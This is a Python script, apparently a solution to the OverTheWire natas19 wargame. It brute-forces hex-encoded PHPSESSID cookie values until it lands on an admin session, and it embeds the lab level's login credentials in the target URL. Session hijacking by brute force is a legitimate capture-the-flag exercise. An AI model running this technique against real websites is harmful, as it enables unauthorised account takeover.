import requests
import binascii

target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
acceptStr = "You are an admin."

r = requests.get(target)
if r.status_code != requests.codes.ok:
        print("cant connect")
        exit()
else:
        print('Target reachable. Starting session brute force...')


known=""
for i in range(1,641):
        if i % 10 == 0:
                print( 'Checked '+str(i)+' sessions...')
        numHexed = (binascii.hexlify(str.encode(str(i)))).decode('utf-8')
        print(numHexed)
        cookies = {"PHPSESSID":numHexed+known}
        r = requests.get(target, cookies=cookies)
        if  acceptStr in str(r.content):
                print ('Got it! Session='+str(i))
                print (r.content)
                break
